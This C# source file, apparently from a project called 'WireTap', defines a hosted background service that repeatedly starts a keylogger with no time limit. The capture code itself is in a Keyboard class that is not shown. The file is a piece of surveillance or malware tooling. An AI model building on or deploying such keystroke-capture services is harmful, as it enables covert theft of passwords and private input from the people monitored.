namespace WireTap.HostedService
{
    using System;
    using System.Threading;
    using System.Threading.Tasks;
    using Microsoft.Extensions.Hosting;
    using WireTap.Logging;

    internal class KeyloggerService : ServiceBase, IHostedService
    {
        private readonly ILogger _logger;

        public KeyloggerService(ILogger logger) : base(logger)
        {
            _logger = logger;
        }

        protected override Task InternalExecuteAsync(CancellationToken cancellationToken)
        {
            Console.WriteLine("Execuing KeyloggerService InternalExecuteAsync");
            _logger.LogInformation("Test test test test");

            while (!cancellationToken.IsCancellationRequested)
            {
                StartKeyLogger();
            }

            return Task.CompletedTask;
        }

        protected void StartKeyLogger()
        {
            //var duration = TimeSpan.FromSeconds(10);
            //var expiration = DateTime.Now.Add(duration);
            //var keyboard = new Keyboard();
            //keyboard.StartKeylogger(() => DateTime.Now < expiration);

            // Cannot use duration FromSeconds due to TraceListener trying to 
            new Keyboard().StartKeylogger(predicate: () => true);
        }
    }
}